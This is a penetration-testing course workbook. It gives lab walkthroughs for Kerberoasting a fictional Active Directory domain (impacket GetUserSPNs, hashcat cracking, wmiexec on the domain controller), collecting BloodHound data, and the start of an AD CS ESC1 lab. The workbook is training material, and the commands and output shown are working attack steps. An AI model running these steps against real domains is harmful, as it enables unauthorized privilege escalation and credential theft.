# **SEC560 | ENTERPRISE PENETRATION TESTING GIAC Penetration Tester (GPEN)**

# Workbook Sections 4-5

![](SEC560_WorkBook2_page_0_Picture_2.jpeg)

© 2025 SANS Institute. All rights reserved to SANS Institute.

PLEASE READ THE TERMS AND CONDITIONS OF THIS COURSEWARE LICENSE AGREEMENT ("CLA") CAREFULLY BEFORE USING ANY OF THE COURSEWARE (DEFINED BELOW) ASSOCIATED WITH THE SANS INSTITUTE COURSE. THIS IS A LEGAL AND ENFORCEABLE CONTRACT BETWEEN YOU (THE "USER") AND THE ESCAL INSTITUTE OF ADVANCED TECHNOLOGIES, INC. /DBA SANS INSTITUTE ("SANS INSTITUTE") FOR THE COURSEWARE. BY ACCESSING THE COURSEWARE, USER AGREES TO BE BOUND BY THE TERMS OF THIS CLA.

With this CLA, SANS Institute hereby grants User a personal, non-exclusive license to use the Courseware subject to the terms of this CLA. Courseware means all printed materials, including course books and lab workbooks, slides or notes, as well as any digital or other media, audio and video recordings, virtual machines, software, technology, or data sets distributed by SANS Institute to User for use in the SANS Institute course associated with the Courseware. User agrees that the CLA is the complete and exclusive statement of agreement between SANS Institute and User and that this CLA supersedes any oral or written proposal, agreement or other communication relating to the subject matter of this CLA.

BY ACCESSING THE COURSEWARE, USER AGREES TO BE BOUND BY THE TERMS OF THIS CLA. USER FURTHER AGREES THAT ANY BREACH OF THE TERMS OF THIS CLA MAY CAUSE IRREPARABLE HARM AND SIGNIFICANT INJURY TO SANS INSTITUTE, AND THAT SANS INSTITUTE MAY ENFORCE THESE PROVISIONS BY INJUNCTION (WITHOUT THE NECESSITY OF POSTING BOND), SPECIFIC PERFORMANCE, OR OTHER EQUITABLE RELIEF.

If User does not agree to the terms of this CLA, User should not access the Courseware. User may return the Courseware to SANS Institute for a refund, if applicable.

User may not copy, reproduce, re-publish, distribute, display, modify or create derivative works based upon all or any portion of the Courseware, in any medium, whether printed, electronic or otherwise, for any purpose, without the express prior written consent of SANS Institute. User may not sell, rent, lease, trade, share, or otherwise transfer the Courseware in any way, shape, or form to any person or entity without the express written consent of SANS Institute. Additionally, User may not upload, submit, or otherwise transmit Courseware to any artificial intelligence system, platform, or service for any purpose, regardless of whether the intended use is commercial, educational, or personal, without the express written consent of SANS Institute. User agrees that the failure to abide by this provision would cause irreparable harm to SANS Institute that is impossible to quantify. User therefore agrees to a base liquidated damages amount of \$5000.00 USD per item of Courseware infringed upon or fraction thereof. In addition, the base liquidated damages amount shall be doubled for any Courseware less than a year old as a reasonable estimation of the anticipated or actual harm caused by User's breach of the CLA. Both parties acknowledge and agree that the stipulated amount of liquidated damages is not intended as a penalty, but as a reasonable estimate of damages suffered by SANS Institute due to User's breach of the CLA.

If any provision of this CLA is declared unenforceable in any jurisdiction, then such provision shall be deemed to be severable from this CLA and shall not affect the remainder thereof. A written amendment or addendum to this CLA that is executed by SANS Institute and User may accompany this Courseware.

SANS Institute may suspend and/or terminate User's access to and require immediate return of any Courseware in connection with any (i) material breaches or material violation of this CLA or general terms and conditions of use agreed to by User, (ii) technical or security issues or problems caused by User that materially impact the business operations of SANS Institute or other SANS Institute customers, or (iii) requests by law enforcement or government agencies.

SANS Institute acknowledges that any and all software and/or tools, graphics, images, tables, charts or graphs presented in this Courseware are the sole property of their respective trademark/registered/copyright owners, including:

The Apple® logo and any names of Apple products displayed or discussed in this book are registered trademarks of Apple, Inc.

PMP® and PMBOK® are registered trademarks of PMI.

SOF-ELK® is a registered trademark of Lewes Technology Consulting, LLC. Used with permission.

SIFT® is a registered trademark of Harbingers, LLC. Used with permission.

VMware Workstation Pro®, VMWare Workstation Player®, VMWare Fusion®, and VMware Fusion Pro® are registered trademarks of VMware, Inc. Used with permission.

Governing Law: This CLA shall be governed by the laws of the State of Maryland, USA.

Courseware licensed to User under this CLA may be subject to export laws and regulations of the United States of America and other jurisdictions. User warrants he or she is not listed (i) on any sanction programs list maintained by the U.S. Office of Foreign Assets Control within the U.S. Treasury Department ("OFAC"), or (ii) denied party list maintained by the U.S. Bureau of Industry and Security within the U.S. Department of Commerce ("BIS"). User agrees to not allow access to any Courseware to any person or entity in a U.S. embargoed country or in violation of a U.S. export control law or regulation. User agrees to cooperate with SANS Institute as necessary for SANS Institute to comply with export requirements and recordkeeping required by OFAC, BIS or other governmental agency.

# *Lab 4.1: Kerberoast*

# Requires VPN Connection

You must have an active OpenVPN connection using the sec560-labs-range.ovpn file from https://connect.labs.sans.org to complete this exercise.

# Background

Your penetration testing of Hiboxy has been successful so far, but you need to escalate privileges within their Active Directory environment. Through your reconnaissance, you've identi fied that Hiboxy uses service accounts for their SQL servers - a common configuration that often introduces vulnerabilities.

Using the domain credentials you've already compromised, you'll enumerate Service Principal Names (SPNs) to identify kerberoastable accounts. The beauty of this attack is that it's intrinsically difficult to detect - you're simply requesting service tickets, which is normal Kerberos behavior. There can be telltales from specific tooling that reveal "Kerberoasting" attacks as opposed to normal service ticket requests (such as requesting the weaker RC4 encryption type), but the high-level action of requesting service tickets is entirely normal. Once you obtain the encrypted tickets, you can crack them offline without risk of account lockouts. Your success in cracking these service account passwords will reveal that one of them belongs to the Domain Admins group, providing you with the keys to Hiboxy's kingdom.

→

# Lab Setup

VMs used:

Linux •

You should be able to ping 10.130.10.10 from the SEC560 Linux VM:

ping -c 4 10 .130.10.10

# Expected Results

```
sec560@560vm:~$ ping -c 4 10 .130.10.10
PING 10.130.10.10 (10.130.10.10) 56(84) bytes of data.
64 bytes from 10.130.10.10: icmp_seq=1 ttl=63 time=67.6 ms
64 bytes from 10.130.10.10: icmp_seq=2 ttl=63 time=67.2 ms
64 bytes from 10.130.10.10: icmp_seq=3 ttl=63 time=69.1 ms
64 bytes from 10.130.10.10: icmp_seq=4 ttl=63 time=73.5 ms
```

--- 10.130.10.10 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 3006ms rtt min/avg/max/mdev = 67.194/69.349/73.533/2.511 ms

In case you've run this lab before, let's perform a bit of clean up. Let's delete the potfile (containing prior cracked hashes and their corresponding passwords) for Hashcat.

### Command

sudo rm /pentest/password-recovery/hashcat/hashcat.potfile

This command has no output if it's successful. If there's no potfile to clean up, you will receive an error. That error is OK.

# Lab – Step-by-Step Instructions

We have already obtained a valid set of (unprivileged) domain credentials. From here, our goal is to further escalate our privileges in the domain by compromising a service account.

#### *1: Enumerate and Request Tickets*

As a first step, we will use the GetUserSPNs.py Python script, which will perform the following steps:

- Enumerate users with a Service Principal Name (SPN). As a reminder, service accounts have a SPN configured! •
- Request a service ticket for these service accounts •

This attack requires access as any user. We'll use hiboxy\bgreen with the password Password1 that we found in 560.2.

We'll use GetUserSPNs.py from impacket. We need to provide a few options:

credentials — We can provide the domain, username, and password like this: hiboxy/bgreen:Password1 •

- -request Tell the tool to request the tickets after it identifies them •
- -dc-ip The IP address of the DC from which we are requesting tickets •

GetUserSPNs.py hiboxy.com/bgreen:Password1-request -dc-ip 10.130.10.4 | tee /tmp/spns.output

# Expected Results

sec560@560vm:~\$ GetUserSPNs.py hiboxy.com/bgreen:Password1-request -dc-ip 10.130.10.4 | tee /tmp/ spns.output

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName Name

MemberOf PasswordLastSet LastLogon

Delegation

------------------------------ --------------- ------------------------------------------ -------------------------- ---------

----------

MSSQLSvc/sql01.Hiboxy.com

SVC\_SQLService 2024-08-13 08:12:58.968552

<never>

MSSQLSvc/sql01.Hiboxy.com:1433

SVC\_SQLService 2024-08-13 08:12:58.968552

<never>

MSSQLSvc/sql02.Hiboxy.com SVC\_SQLService2 CN=Domain

Admins,CN=Users,DC=hiboxy,DC=com 2024-08-13 08:12:59.125293 <never>

MSSQLSvc/sql02.Hiboxy.com:1433 SVC\_SQLService2 CN=Domain

Admins,CN=Users,DC=hiboxy,DC=com 2024-08-13 08:12:59.125293 <never>

## [-] CCache file is not found. Skipping...

\$krb5tgs\$23\$\*SVC\_SQLService\$HIBOXY.COM\$hiboxy.com/SVC\_SQLService\*\$9f6b...

\$krb5tgs\$23\$\*SVC\_SQLService2\$HIBOXY.COM\$hiboxy.com/SVC\_SQLService2\*\$95fb...

In the output of the command, you should identify two service accounts SVC\_SQLService and SVC\_SQLService2. You'll also see information on the privileges the account has in the domain. It appears the SVC\_SQLService2 account is in the Domain Admins group, excellent!

Additionally, the tee command displays the output passed down the pipeline from the previous command and saves the output to a file.

Finally, you'll also see a long string that starts off with \$krb5tgs\$23\$. This is the service ticket encrypted using RC4 (the 23 refers to encryption type RC4) which we can now try to brute force!

Note that in a large enterprise environment, you would likely see hundreds or thousands of service accounts. During such an engagement, one would request service tickets for a large number of these accounts, hoping to be able to crack at least one of them.

There are actually many more service accounts in the environment, but the tool only searches for those services with an SPN associated with a user account, since it may be crackable. Computer account password hashes are randomly generated and are effectively uncrackable.

It is worth noting that there are several ways to extract service account information from the domain; Impacket's GetUserSPN's is just one of them. Another good example would be the Invoke-Kerberoast commandlet in the Powerview suite. Some of these tools might also include the krbtgt account as a service account. While this is technically correct, it's not an account that is vulnerable to Kerberoasting. The krbtgt account password is generated by the system (using a long and highly random password), which makes it effectively immune to bruteforce cracking attacks.

# *2: Cracking the ticket*

As a next step, we will now try to recover the password for the two accounts by brute forcing the service ticket we obtained. We will use hashcat as our tool of choice for this!

We've used Hashcat previously in the course, and you'll likely remember it requires the following inputs:

- A dictionary file •
- A hash to crack •
- The hash type (mode) •
- The kind of attack you'd like to execute (bruteforce, wordlist, mask attack, ...) •

If you don't immediately recognize the hashmode you can always use hashcat --example-hashes to see examples of hashes with their corresponding modes or you can browse to the official hashcat documentation on: https://hashcat.net/wiki/doku.php?id=example\_hashes .

The tee command above saved all the output, but we only want the crackable lines. Let's extract that from the original file. Recall that the output contained \$krb5tgs\$23\$ at the beginning. We can use grep with a portion of this text to save the hashes to a file ready for cracking.

## Command

grep krb5tgs /tmp/spns.output > /tmp/tickets

When reviewing the hashcat documentation, you'll note that the \$krb5tgs\$23\$ output we previously obtained is referenced in hashcat as mode 13100.

Since many passwords tend to have capitalized words, let's take an existing wordlist of compromised credentials ( /usr/share/ wordlists/rockyou.txt ) and capitalize the first letter using sed. We'll also add a number to the end of each word to save time.

sed 's/.\*/\u&/' /usr/share/wordlists/rockyou.txt > ~/labs/Rockyou.txt hashcat -m 13100 -a 6 /tmp/tickets ~/labs/Rockyou.txt ?d

# Expected Results

sec560@560vm:~\$ hashcat -m 13100 -a 6 /tmp/tickets ~/labs/Rockyou.txt ?d hashcat (v7.1.2) starting

...truncated for brevity...

\$krb5tgs\$23\$\*SVC\_SQLService\$HIBOXY.COM\$hiboxy.com/ SVC\_SQLService\*\$5c88ace8e2614d9aeb272ed6a13e8317\$1d8df0a3e9c5c386795a21502d91a8839883d129d410ac69bca8fea85f279

...truncated for brevity...

Don't forget about tab completion! Type the first few characters of the filename (or directory), then press tab.

This will run for about a minute, after which it should reveal the password of Supercool7.

# *3: Cracking the domain admin ticket*

We cracked one of the tickets. Let's crack the second one.

This time we'll prepend ( -a 7 ) a special character ( ?s ). We need to change the order of the mask and the dictionary too. Let's capitalize an existing large dictionary.

sed 's/.\*/\u&/' /usr/share/dict/american-english-insane > /home/sec560/labs/American-English-Insane.txt hashcat -m 13100 -a 7 /tmp/tickets ?s /home/sec560/labs/American-English-Insane.txt

# Expected Results

sec560@560vm:~\$ hashcat -m 13100 -a 7 /tmp/tickets ?s /home/sec560/labs/American-English-Insane.txt hashcat (v7.1.2) starting

...trimmed for brevity...

\$krb5tgs\$23\$\*SVC\_SQLService2\$HIBOXY.COM\$hiboxy.com/SVC\_SQLService2\*\$f20b8

...trimmed for brevity...

782b1f5c697ea4b610b54350e12a50c4:^Cakemaker

# Curious about that sed command?

The sed utility makes text transformations, either from standard input (STDIN) or from a source file. It can operate on the existing file (with -i ), but it defaults to outputing the changed text. In this case, we're using the s command to substitute the pattern .\* (which matches any character zero or more times) with \u& , which capitalizes the first letter of each line. The & is a special character in sed that represents the entire matched pattern. The american-english-insane file is a list of words, one per line, so we're capitalizing the first letter of each word in that file.

We found the password for the SVC\_SQLService2 account, which if you'll recall from above, is a member of the Domain Admins group!

#### *4: Use stolen credential*

As a last step, we will now use our freshly stolen credential to access the domain controller (DC01 - 10.130.10.4).

As we like to start from a clean plate, please close the hashcat terminal prompt or type clear to get a clear terminal:

# Command

clear

We will use wmiexec.py to execute commands on DC01 using our newly compromised SVC\_SQLService2 account.

Recall the syntax of this command is:

#### wmiexec.py *username*:*password*@*target command*

- Username: The username is in the format of domain/username, in our case the domain is hiboxy.com and the username is SVC\_SQLService2, so the full username is hiboxy.com/SVC\_SQLService2 •
- Password •
- Target: This is the target system, in our case the domain controller IP address 10.130.10.4 •
- Command: The command to run, we'll use whoami first •

Run the wmiexec.py script with the whoami command:

#### Command

wmiexec.py hiboxy.com/SVC\_SQLService2:^Cakemaker@10.130.10.4 whoami

# Expected Results

sec560@560vm:~\$ wmiexec.py hiboxy.com/SVC\_SQLService2:^Cakemaker@10.130.10.4 whoami Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[\*] SMBv3.0 dialect used hiboxy\svc\_sqlservice2

Next, we can confirm we are on the Domain Controller as the svcsqlserver account using the hostname command. Simply press the up arrow, and replace whoami with hostname.

### Command

wmiexec.py hiboxy.com/SVC\_SQLService2:^Cakemaker@10.130.10.4 hostname

#### Expected Results

sec560@560vm:~\$ wmiexec.py hiboxy.com/SVC\_SQLService2:^Cakemaker@10.130.10.4 hostname Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[\*] SMBv3.0 dialect used dc01

Let's now run the net user command. Instead of retyping the previous command, press the up arrow to go to your previous command and then use backspace (or Ctrl+W to delete a whole word) to delete hostname and then type net user .

Run wmiexec.py with the net user command to get a list of the domain users:

wmiexec.py hiboxy.com/SVC\_SQLService2:^Cakemaker@10.130.10.4 net user

# Expected Results

sec560@560vm:~\$ wmiexec.py hiboxy.com/SVC\_SQLService2:^Cakemaker@10.130.10.4 net user Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[\*] SMBv3.0 dialect used

User accounts for \\

-------------------------------------------------------------------------------

\$OK1000-O8RL70HT3R44aallenaalvarado

abaird abates abecker abrown acarter achavez

...truncated for brevity...

Finally, we can run the net user command to see what groups SVC\_SQLService2 is a member of:

wmiexec.py hiboxy.com/SVC\_SQLService2:^Cakemaker@10.130.10.4 net user SVC\_SQLService2

# Expected Results

sec560@560vm:~\$ wmiexec.py hiboxy.com/SVC\_SQLService2:^Cakemaker@10.130.10.4 net user SVC\_SQLService2 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[\*] SMBv3.0 dialect used

User name SVC\_SQLService2

Full Name Comment

User's comment

Country/region code 000 (System Default)

Account active Yes Account expires Never

Password last set 8/13/2024 8:12:59 AM Password expires 9/24/2024 8:12:59 AM Password changeable 8/14/2024 8:12:59 AM

Password required Yes User may change password Yes

Workstations allowed All

Logon script User profile Home directory

Last logon Never

Logon hours allowed All

Local Group Memberships

Global Group memberships \*Schema Admins \*Domain Admins

\*Domain Users \*Enterprise Admins

The command completed successfully.

One of the groups is the "Domain Admins" group!

Congratulations! You have successfully cracked a service account with domain admin privileges!

It is worth noting that several other tools could be used to establish command execution using the compromised account. Another prime candidate would be psexec.py (also part of the impacket suite) or psexec.exe, a Microsoft signed binary that can be used to obtain an interactive session on Windows machines.

# Conclusion

In conclusion, in this lab, we identified two SPN-enabled user accounts that were configured with a weak password. We requested RC4-encrypted service tickets, which allowed us to launch a brute force attack using hashcat. Finally, we used one of the compromised accounts to obtain Domain Admin privileges in the environment.

Kerberoasting is a highly effective attack technique that does not rely on missing patches or misconfigurations and can thus provide a "way in" in reasonably well-secured environments!

# *Lab 4.2: BloodHound*

# Requires VPN Connection

You must have an active OpenVPN connection using the sec560-labs-range.ovpn file from https://connect.labs.sans.org to complete this exercise. If you don't have a VPN profile available, some existing data from bloodhound-python and rusthound

# Background

While you've gained significant access to Hiboxy's network, you need to understand the complete attack paths available to you. BloodHound will help you map out the Active Directory environment and identify the most e fficient routes to your objectives.

Using both bloodhound-python and rusthound, you'll collect comprehensive data about users, groups, computers, and their relationships. The visual analysis will reveal attack paths you might have missed through manual enumeration. Most importantly, you'll discover which of the Kerberoastable accounts you identified earlier have paths to Domain Admin privileges, validating your previous findings and potentially revealing additional attack vectors.

→

# Lab Setup

VM used:

Linux •

You should be able to ping 10.130.10.5 from the Linux VM:

ping -c 4 10 .130.10.5

# Expected Results

```
sec560@560vm:~$ ping -c 4 10 .130.10.5
PING 10.130.10.5 (10.130.10.5) 56(84) bytes of data.
64 bytes from 10.130.10.5: icmp_seq=1 ttl=127 time=159 ms
64 bytes from 10.130.10.5: icmp_seq=2 ttl=127 time=112 ms
64 bytes from 10.130.10.5: icmp_seq=3 ttl=127 time=189 ms
64 bytes from 10.130.10.5: icmp_seq=4 ttl=127 time=169 ms
```

--- 10.130.10.5 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 3000ms

rtt min/avg/max/mdev = 112.306/157.392/189.090/28.165 ms

# Lab – Step-by-Step Instructions

# *1: Gather BloodHound Data using bloodhound-python*

The general workflow of BloodHound analysis is as follows:

- Inside the target environment, with network connectivity to the domain controller and other domain-joined systems, gather BloodHound data using an ingestor, such as the o fficial SharpHound.exe, bloodhound-python, or rusthound. 1.
- Exfiltrate the extracted information (either JSON files or zip files, depending on the ingestor and options) to an external system with the BloodHound user interface installed. 2.
- Load the extracted information into the BloodHound user interface (either by drag-and-dropping the files, or by using the Upload button). 3.
- Analyze the gathered BloodHound data using the BloodHound to find useful "paths" from compromised users to high-value targets, such as Domain Admins. 4.
- Back in the target environment, use the information gathered from BloodHound to exploit the chains of misconfigurations and features allowing useful access (such as a path from an initially-compromised user to the Domain Admins group). 5.

Since we'll be gathering the BloodHound data from the same system that we'll be using to analyze that data, we won't need to exfiltrate that data. We will need to start the Neo4j database, however:

sudo systemctl start neo4j

# Expected Results

This command has no output.

# First, we'll use bloodhound-python

implementation of a BloodHound data ingestor, like SharpHound .

Let's get the usage for the command first.

# Command bloodhound-python Expected Results sec560@560vm:~\$bloodhound-python INFO: BloodHound.pyfor BloodHoundLEGACY( BloodHound 4 .2 and 4 .3 ) usage: bloodhound-python [ -h ] [ -c COLLECTIONMETHOD ] [ -d DOMAIN] [ -v ] [ -u USERNAME ] [ -p PASSWORD] [ -k ] [ --hashes HASHES] [ -no-pass] [ -aesKey hex key] [ --auth-method { auto,ntlm,kerberos}] [ -ns NAMESERVER ] [ --dns-tcp ] [ --dns-timeout DNS\_TIMEOUT] [ -dc HOST] [ -gc HOST] [ -w WORKERS] [ --exclude-dcs ] [ --disable-pooling ] [ --disable-autogc ] [ --zip ] [ --computerfile COMPUTERFILE ] [ --cachefile CACHEFILE] [ --use-ldaps ] [ -op PREFIX\_NAME] Python based ingestor for BloodHound For help or reporting issues, visit https://github.com/Fox-IT/BloodHound.py optional arguments: -h, --helpshowthis help message andexit -c COLLECTIONMETHOD, --collectionmethod COLLECTIONMETHOD Which information to collect. Supported: Group, LocalAdmin, Session, Trusts, Default ( all previous) , DCOnly ( no computerconnections), DCOM, RDP,PSRemote, LoggedOn,Container, ObjectProps, ACL, All ( all except LoggedOn). You can specify more than one by separating them with a comma.( default: Default ) -d DOMAIN, --domain DOMAIN

Note that not all methods are used by default. Importantly, the servicePrincipalName attribute (and thereby Kerberoastable users) is not collected by default. To collect this information, we will specify the All collection method. Otherwise, amongst other things, we will not be able to find Kerberoastable users when analyzing this data via the BloodHound user interface.

[...additional output skipped... ]

Since we may not have the domain controller set as our DNS server, bloodhound-python helpfully allows us to set the nameserver ( -ns ) to the domain controller's IP address. This allows DNS resolution to work correctly.

bloodhound-python -d hiboxy.com -u bgreen -p Password1-c All -ns 10.130.10.4

#### Expected Results

```
sec560@560vm:~$bloodhound-python -d hiboxy.com -u bgreen -p Password1-c All -ns 10.130.10.4
INFO: Found AD domain: hiboxy.com
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.hiboxy.com
INFO: Found 1 domains
INFO: Found 1 domainsin the forest
INFO: Found 11 computers
INFO: Connecting to LDAP server: dc01.hiboxy.com
INFO: Found 573 users
INFO: Found 80 groups
INFO: Found 2 gpos
INFO: Found 10 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumerationwith 10 workers
INFO: Querying computer: sql02.hiboxy.com
INFO: Querying computer: file02.hiboxy.com
INFO: Querying computer: sql01.hiboxy.com
INFO: Querying computer: jump01.hiboxy.com
INFO: Querying computer: rdp01.hiboxy.com
INFO: Querying computer: file01.hiboxy.com
INFO: Querying computer: web01.hiboxy.com
INFO: Querying computer: mail01.hiboxy.com
INFO: Querying computer: ca01.hiboxy.com
INFO: Querying computer: web02.hiboxy.com
INFO: Querying computer: dc01.hiboxy.com
INFO: Donein 00M 35S
```

Once bloodhound-python has finished, you'll have a set of JSON files in the current directory. These files contain the data that BloodHound will ingest, such as users, groups, computers, and user's logon sessions.

```
ls -l *.json
```

#### Expected Results

```
sec560@560vm:~$ls -l *.json
-rw-rw-r-- 1 sec560 sec560 32144 Aug 9 09 :49 20240809094825_computers.json
-rw-rw-r-- 1 sec560 sec560 28630 Aug 9 09 :48 20240809094825_containers.json
-rw-rw-r-- 1 sec560 sec560 3895 Aug 9 09 :48 20240809094825_domains.json
-rw-rw-r-- 1 sec560 sec560 3950 Aug 9 09 :48 20240809094825_gpos.json
-rw-rw-r-- 1 sec560 sec560 187627 Aug 9 09 :48 20240809094825_groups.json
-rw-rw-r-- 1 sec560 sec560 63467 Aug 9 09 :48 20240809094825_ous.json
-rw-rw-r-- 1 sec560 sec560 1444067Aug 9 09 :48 20240809094825_users.json
```

bloodhound-python is a great tool for gathering BloodHound data from a Linux environment. It's convenient to install ( python3 -m pip install bloodhound-python ) and can be proxied via proxychains if needed.

However, it does have a few downsides:

- It's not as feature-complete as the Windows version ( SharpHound.exe), as new features (like new object types or relationships) are added to the Windows version first by the SpecterOps team. •
- It's difficult to get working in embedded environments, where installing Python itself could be difficult (vendor appliances, lowresourced machines, etc). •
- It's a little slower than the Windows version, as it's not as optimized for performance. •

To address these issues, we can use RustHound, a Rust-based implementation of the BloodHound data collector. It's a single binary that can be run on nearly any platform and operating system, including embedded systems, and is usually faster even than the Windows SharpHound executable.

# *2: Gather BloodHound Data using RustHound*

Next, we'll use rusthound to gather the same BloodHound data. We'll also include the -z option to zip the output files for easier upload to BloodHound. bloodhound-python has the same capability, and also uses the -z option.

rusthound -d hiboxy.com -u bgreen@hiboxy.com -p Password1 -f DC01.hiboxy.com -z

```
Expected Results
 sec560@560vm:~$rusthound -d hiboxy.com -u bgreen@hiboxy.com -p Password1 -f DC01.hiboxy.com -z
 ---------------------------------------------------
 Initializing RustHound at 10:40:16 on 08/10/24
 Poweredby g0h4n from OpenCyber
 ---------------------------------------------------
 [2024-08-10T10:40:16Z INFO rusthound] Verbosity level: Info
 [2024-08-10T10:40:16Z INFO rusthound::ldap ] Connectedto HIBOXY.COM ActiveDirectory!
 [2024-08-10T10:40:16Z INFO rusthound::ldap ] Starting data collection...
 [2024-08-10T10:40:20Z INFO rusthound::ldap ] All data collected for NamingContextDC=hiboxy,DC=com
 [2024-08-10T10:40:20Z INFO rusthound::json::parser ] Starting the LDAP objects parsing...
 [2024-08-10T10:40:20Z INFO rusthound::json::parser::bh_41 ] MachineAccountQuota: 10
 ⠁ Parsing LDAP objects:
 24% 
 [2024-08-10T10:40:20Z INFO rusthound::json::parser::bh_41 ] ADCSfound DC=com,DC=hiboxy,CN=hiboxy-
 CA01-CA, use --adcs args to collect the certificate templates and certificate authority.
 [2024-08-10T10:40:20Z INFO rusthound::json::parser ] Parsing LDAPobjects finished!
 [2024-08-10T10:40:20Z INFO rusthound::json::checker ] Starting checker to replace somevalues...
 [2024-08-10T10:40:20Z INFO rusthound::json::checker ] Checking and replacing some values finished!
 [2024-08-10T10:40:20Z INFO rusthound::json::maker ] 573 users parsed!
 [2024-08-10T10:40:20Z INFO rusthound::json::maker ] 88 groups parsed!
 [2024-08-10T10:40:20Z INFO rusthound::json::maker ] 11 computersparsed!
 [2024-08-10T10:40:20Z INFO rusthound::json::maker ] 10 ous parsed!
 [2024-08-10T10:40:20Z INFO rusthound::json::maker ] 1 domains parsed!
 [2024-08-10T10:40:20Z INFO rusthound::json::maker ] 2 gpos parsed!
 [2024-08-10T10:40:20Z INFO rusthound::json::maker ] 23 containers parsed!
 [2024-08-10T10:40:20Z INFO rusthound::json::maker ] .//20240810104020_hiboxy-com_rusthound.zip created!
 RustHoundEnumeration Completed at 10:40:20 on 08/10/24! Happy Graphing!
```

This command collects all available information from the domain controller DC01.hiboxy.com using the specified credentials. It's also signi ficantly faster than other BloodHound ingestors, and can also be proxied via proxychains as needed.

#### *3: Launch BloodHound*

Once we have gathered the data from the target environment, we need to load it into our local BloodHound database. First, we'll launch BloodHound:

/opt/BloodHound/BloodHound --no-sandbox

# Expected Results

This command starts the BloodHound user interface, and doesn't have any relevant output.

# *4: Login to BloodHound*

In the BloodHound login prompt, enter the following credentials and click Login :

Username: neo4j •

Password: sec560 •

# BloodHound Password Change

If the BloodHound UI tells you there's "No database found", make sure to start the neo4j service with sudo systemctl start neo4j . It may take a few moments to start up.

#### *5: Upload BloodHound Data*

Next, we'll upload the BloodHound data we've gathered into the BloodHound user interface, so we can analyze it there. Click on the upload icon on the right side of the BloodHound interface and click to open the upload window:

![](SEC560_WorkBook2_page_20_Figure_0.jpeg)

Next, select the .json and .zip files that were generated by bloodhound-python and rusthound, respectively. Click Open to upload the files.

![](SEC560_WorkBook2_page_21_Figure_0.jpeg)

The upload will be processed, which will show a status window. Once the processing is complete, close the *Upload Progress* window.

#### *6: Pathfinding in BloodHound*

Now that we have the data loaded into BloodHound, we can start analyzing the data to find paths that are interesting to us. In this case, we'll look for the most powerful path first: from Domain Users to Domain Admins. If this path exists, it means that any compromised user can escalate their privileges to Domain Admin. To put it mildly, that's a finding.

Click the pathfinding icon in the upper-left portion of the BloodHound UI:

![](SEC560_WorkBook2_page_22_Picture_0.jpeg)

In the "Start Node" field, type Domain Users. Note that BloodHound will auto-complete the name for you to DOMAIN USERS@HIBOXY.COM . Either press the *Tab* key or click on the auto-completed name to select it.

![](SEC560_WorkBook2_page_22_Picture_2.jpeg)

Next, in the "Target Node" field, type Domain Admins and autocomplete to DOMAIN ADMINS@HIBOXY.COM . BloodHound will immediately search for any paths from the start node to the target node.

In this case, BloodHound will alert that no such paths were found via the NO DATA RETURNED FROM QUERY message, as shown below.

![](SEC560_WorkBook2_page_22_Picture_5.jpeg)

This isn't unusual. However, it's a good first check, as if a path *is* found, it's a critical finding.

# *7: Built-In Queries: Find all Domain Admins*

Next, let's look at some of the built-in queries inside BloodHound. Click the hamburger icon (three horizontal lines) in the upper-left corner of the BloodHound UI:

![](SEC560_WorkBook2_page_23_Picture_0.jpeg)

Next, click the Analysis tab, and click on the Find all Domain Admins query. BloodHound will immediately display all members of the Domain Admins group, along with the Domain Admins group object itself. You can zoom in and out with your mouse wheel, click and drag to move the graph around, and click on nodes to see more information about them. You can also press the Ctrl key to toggle displaying all node labels, some labels (the "default node threshold" based on size), or no labels.

Click on the SVC\_SQLSERVICE2@HIBOXY.COM user icon. This will display more information about this user account in the Node Info tab on the left side of the BloodHound UI.

![](SEC560_WorkBook2_page_23_Figure_3.jpeg)

Scroll down in the node info window. Notice that SVC\_SQLSERVICE2 has several Service Principal Names registered. This means that this user account is Kerberoastable, and any domain account can effectively get a crackable password hash for this account. If the password can be cracked, the attacker can log on as this account and escalate their privileges to Domain Admin, since SVC\_SQLSERVICE is already a member of the Domain Admins group.

# *8: Built-In Queries: Paths from Kerberoastable Users to Domain Admins*

Let's show another way we could have found out about the Kerberoastable account with Domain Admin privileges. Go back to the Analysis tab of the BloodHound UI, then scroll to the Shortest Paths section before selecting the Shortest Paths to Domain Admins from Kerberoastable Users query.

BloodHound will next ask which Domain Admins group you'd like to find paths to. In this case, we only have the one domain of data, but if there are multiple domains loaded, they'd all appear here. Click on the DOMAINS ADMINS@HIBOXY.COM icon in the prompt:

![](SEC560_WorkBook2_page_24_Picture_4.jpeg)

Now, BloodHound will show the path from the Kerberoastable user (SVC\_SQLSERVICE2) to the Domain Admins group. In this case, it's a direct path, as SVC\_SQLSERVICE2 is already a member of the Domain Admins group.

In other words, if we can crack the Kerberoastable password hash for SVC\_SQLSERVICE2, we can log in as that account and escalate our privileges to Domain Admin.

![](SEC560_WorkBook2_page_24_Picture_7.jpeg)

# Conclusion

In this lab, we demonstrated how to gather BloodHound data using bloodhound-python and rusthound, load the data into BloodHound, and analyze the BloodHound data (including built-in queries and path finding). These techniques are critical in understanding potential attack paths within an Active Directory environment and formulating effective defense strategies.

# *Lab 4.3: Attacking Active Directory Certificate Services (AD CS) with ESC1*

# Requires VPN Connection

You must have an active OpenVPN connection using the sec560-labs-range.ovpn file from https://connect.labs.sans.org to complete this exercise.

# Background

Your investigation reveals that Hiboxy has deployed Active Directory Certificate Services, likely for internal PKI needs. However, like many organizations, they've left dangerous miscon figurations in their certificate templates.

You'll identify templates vulnerable to ESC1 attacks - where users can specify arbitrary Subject Alternative Names (SANs) in their certificate requests. This misconfiguration allows you to request certificates for any user, including domain administrators. With these certificates, you can authenticate as high-privileged users without knowing their passwords, providing yet another path to domain dominance that bypasses traditional credential-based defenses.

→

# Lab Setup

VM used:

- Linux •
- Windows 11 •

# Lab – Step-by-Step Instructions

#### *1: Preparation*

We are on a VPN. We could have the VPN take control of our DNS, but we often don't want to do that. If we do, then the target organization learns all about what we're querying for, which we may not want to do. Also, they may have DNS filtering or alerting. We'd likely want to avoid the extra logs, and we sure want to avoid the alerts.

